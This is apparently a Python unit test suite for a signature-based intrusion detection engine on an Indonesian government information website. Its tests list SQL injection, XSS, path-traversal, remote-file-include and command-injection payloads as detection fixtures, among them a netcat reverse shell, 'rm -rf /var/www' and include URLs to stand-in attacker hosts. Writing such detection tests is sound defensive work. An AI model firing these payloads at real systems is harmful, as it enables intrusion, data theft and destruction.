"""
Automated Unit & Integration Test Suite for HIDPS Signature-Based Detection Engine
Proyek: PPID Kementerian Agama Kota Parepare
Command: python3 -m unittest discover -s hidps-engine/tests
"""

import os
import sys
import tempfile
import time
import unittest
from pathlib import Path

# Add hidps-engine to sys.path
ENGINE_ROOT = Path(__file__).resolve().parent.parent
if str(ENGINE_ROOT) not in sys.path:
    sys.path.insert(0, str(ENGINE_ROOT))

from config import HidpsConfig, is_safe_log_path, redact_secret
from monitor import (
    HidpsDatabase,
    HidpsMonitor,
    check_telegram_health,
    execute_response_action,
    is_safe_ip,
    sanitize_uri_for_storage,
)
from signatures import SIGNATURE_CATALOG, evaluate_request, normalize_payload


class TestHidpsSignatures(unittest.TestCase):
    def test_catalog_has_all_five_categories(self):
        categories = {r.category for r in SIGNATURE_CATALOG}
        expected = {"SQLI", "XSS", "PATH_TRAVERSAL", "RFI", "COMMAND_INJECTION"}
        self.assertEqual(categories, expected)
        self.assertGreaterEqual(len(SIGNATURE_CATALOG), 20)

    def test_sqli_detections(self):
        payloads = [
            "/informasi-publik?q=' UNION ALL SELECT 1,username,password FROM users--",
            "/cek-status?tiket=PPID-2026' OR 1=1--",
            "/berita?id=1; DROP TABLE permohonan",
            "/api?id=1 AND SLEEP(5)",
            "/search?q=information_schema.tables",
        ]
        for p in payloads:
            matches = evaluate_request(p)
            self.assertTrue(
                any(m.category == "SQLI" for m in matches),
                f"Expected SQLI match for payload: {p}",
            )

    def test_xss_detections(self):
        payloads = [
            "/search?q=<script>alert('xss')</script>",
            "/kontak?nama=<img src=x onerror=alert(1)>",
            "/redirect?next=javascript:alert(document.cookie)",
            "/view?html=<svg onload=alert(1)>",
        ]
        for p in payloads:
            matches = evaluate_request(p)
            self.assertTrue(
                any(m.category == "XSS" for m in matches),
                f"Expected XSS match for payload: {p}",
            )

    def test_path_traversal_and_lfi_detections(self):
        payloads = [
            "/download?file=../../../../etc/passwd",
            "/download?file=..%252f..%252f.env",
            "/view?page=php://filter/convert.base64-encode/resource=index.php",
            "/static/../../../proc/self/environ",
        ]
        for p in payloads:
            matches = evaluate_request(p)
            self.assertTrue(
                any(m.category == "PATH_TRAVERSAL" for m in matches),
                f"Expected PATH_TRAVERSAL match for payload: {p}",
            )

    def test_rfi_detections(self):
        payloads = [
            "/index.php?page=http://evil.example.com/shell.txt",
            "/load?include=ftp://attacker.org/backdoor.php",
            "/view?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=",
        ]
        for p in payloads:
            matches = evaluate_request(p)
            self.assertTrue(
                any(m.category == "RFI" for m in matches),
                f"Expected RFI match for payload: {p}",
            )

    def test_command_injection_detections(self):
        payloads = [
            "/api/ping?ip=127.0.0.1;cat /etc/passwd",
            "/diag?host=localhost|nc -e /bin/bash 10.0.0.1 4444",
            "/exec?cmd=&& rm -rf /var/www",
            "/win?run=powershell.exe -enc aGVsbG8=",
        ]
        for p in payloads:
            matches = evaluate_request(p)
            self.assertTrue(
                any(m.category == "COMMAND_INJECTION" for m in matches),
                f"Expected COMMAND_INJECTION match for payload: {p}",
            )

    def test_benign_ppid_requests_produce_zero_false_positives(self):
        benign_requests = [
            "/",
            "/profil-ppid",
            "/informasi-publik?kategori=berkala&search=jadwal+pelayanan+haji",
            "/cek-status?tiket=PPID-2026-00015",
            "/ajukan-permohonan",
            "/pengajuan-keberatan?tiket=PPID-2026-00001",
            "/berita/sosialisasi-keterbukaan-informasi-publik-kemenag-parepare",
            "/statistik",
            "/survei-kepuasan-masyarakat",
        ]
        for req in benign_requests:
            matches = evaluate_request(req, user_agent="Mozilla/5.0 (X11; Linux x86_64)")
            self.assertEqual(
                len(matches),
                0,
                f"False positive triggered on benign request {req}: {matches}",
            )

    def test_redos_protection_and_length_bounding(self):
        # 50KB pathological string
        huge_payload = "/search?q=" + ("A" * 50000) + "' OR 1=1--"
        start = time.monotonic()
        normalized = normalize_payload(huge_payload)
        self.assertLessEqual(len(normalized), 8192)
        _ = evaluate_request(huge_payload)
        elapsed_ms = (time.monotonic() - start) * 1000
        self.assertLess(elapsed_ms, 100.0, "Regex evaluation took too long (ReDoS risk)")


class TestHidpsMonitorAndDatabase(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_events.db")
        self.log_path = os.path.join(self.temp_dir.name, "test_access.log")
        self.config = HidpsConfig(
            db_path=self.db_path,
            log_path=self.log_path,
            mode="detect_only",
            dedup_window_seconds=60,
            telegram_bot_token="",
            telegram_chat_id="",
            ufw_enabled=False,
        )
        self.monitor = HidpsMonitor(self.config)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_combined_log_parsing_and_deduplication(self):
        log_line = (
            '45.134.22.10 - - [24/Oct/2026:14:15:00 +0000] '
            '"GET /informasi-publik?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" '
            '200 1234 "-" "Mozilla/5.0"'
        )
        events_first = self.monitor.process_line(log_line)
        self.assertGreaterEqual(len(events_first), 1)
        self.assertEqual(events_first[0]["source_ip"], "45.134.22.10")
        self.assertEqual(events_first[0]["category"], "XSS")

        # Immediate duplicate must be suppressed within the 60s window
        events_duplicate = self.monitor.process_line(log_line)
        self.assertEqual(len(events_duplicate), 0)

        rows, total = self.monitor.db.get_events(category="XSS")
        self.assertEqual(total, len(events_first))

    def test_response_modes_and_ip_whitelist(self):
        self.assertTrue(is_safe_ip("127.0.0.1"))
        self.assertTrue(is_safe_ip("::1"))
        self.assertFalse(is_safe_ip("185.196.8.14"))

        # Loopback IP must always be WHITELISTED_SKIPPED
        sim_cfg = HidpsConfig(
            db_path=self.db_path,
            log_path=self.log_path,
            mode="simulation",
            dedup_window_seconds=60,
            telegram_bot_token="",
            telegram_chat_id="",
            ufw_enabled=True,
        )
        self.assertEqual(
            execute_response_action("127.0.0.1", "CRITICAL", sim_cfg),
            "WHITELISTED_SKIPPED",
        )
        self.assertEqual(
            execute_response_action("185.196.8.14", "CRITICAL", sim_cfg),
            "SIMULATED_BLOCK",
        )

    def test_secret_redaction_and_unconfigured_telegram(self):
        token = "123456789:AAHfiqksKZ8WmR2zS9xP0_secretTokenValue"
        masked = redact_secret(token)
        self.assertNotIn("AAHfiqksKZ8WmR2zS9xP0", masked)
        self.assertIn("REDACTED", masked)

        health = check_telegram_health("", "")
        self.assertEqual(health["status"], "NOT_CONFIGURED")
        self.assertFalse(health["connected"])

    def test_log_path_safety_and_traversal_rejection(self):
        self.assertTrue(is_safe_log_path("/var/log/nginx/access.log"))
        self.assertTrue(is_safe_log_path("/var/log/apache2/access.log"))
        # Reject traversal and null bytes
        self.assertFalse(is_safe_log_path("/var/log/nginx/../../etc/passwd"))
        self.assertFalse(is_safe_log_path("/etc/shadow\x00.log"))
        self.assertFalse(is_safe_log_path("/home/avva/.ssh/id_rsa"))

    def test_sanitize_uri_for_storage(self):
        dirty = "/login?user=admin&password=SuperSecretPassword123&token=eyJhbGciOi...&key=secretKey"
        clean = sanitize_uri_for_storage(dirty)
        self.assertNotIn("SuperSecretPassword123", clean)
        self.assertNotIn("eyJhbGciOi...", clean)
        self.assertNotIn("secretKey", clean)
        self.assertIn("password=[REDACTED]", clean)
        self.assertIn("token=[REDACTED]", clean)
        self.assertIn("key=[REDACTED]", clean)

    def test_is_demo_event_distinction(self):
        log_line = (
            '45.134.22.10 - - [24/Oct/2026:14:15:00 +0000] '
            '"GET /informasi-publik?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" '
            '200 1234 "-" "Mozilla/5.0"'
        )
        # Process as demo
        events_demo = self.monitor.process_line(log_line, is_demo=True)
        self.assertGreaterEqual(len(events_demo), 1)
        self.assertTrue(all(ev["is_demo"] for ev in events_demo))

        stats = self.monitor.db.get_stats()
        self.assertIn("demo_events", stats)
        self.assertIn("real_events", stats)
        self.assertEqual(stats["demo_events"], len(events_demo))
        self.assertEqual(stats["real_events"], 0)


if __name__ == "__main__":
    unittest.main()
